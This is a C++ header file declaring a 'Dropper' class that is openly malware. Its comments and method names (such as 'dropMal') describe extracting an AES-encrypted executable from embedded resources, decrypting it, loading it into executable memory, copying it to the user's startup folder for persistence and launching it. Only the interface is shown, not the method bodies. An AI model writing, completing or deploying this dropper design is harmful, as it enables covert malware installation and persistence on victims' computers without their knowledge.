#pragma once
#include <windows.h>
#include <stdlib.h>
#include "Resources.h"
/*
extracts exe from resources
calls decrypter to decrypt AES encrypted exe
allocates memory in virtual address space for exe and copies it there
makes allocated memory executable
copies exe to user's startup file
launches exe
*/
class Dropper
{
public:
	Dropper() 
	{
		resHandle = NULL;
		resrc = NULL; 
		exeBin = nullptr;
		exeBinLen = 0;
	}
	
	void dropMal();
private:
	// hold pointer to allocated memory
	// extract exe from resources
	void extractExe();
	// launch the exe/payload
	void launchExe(wchar_t* pathOfExe);
	// copy the exe to the user's start-up folder
	wchar_t* saveExeToDisk();
	char* genDestPath();
	void writeBytesToLoc(wchar_t* pathOfExe);

	HGLOBAL resHandle;
	HRSRC resrc;
	unsigned char* exeBin;
	unsigned int exeBinLen;
};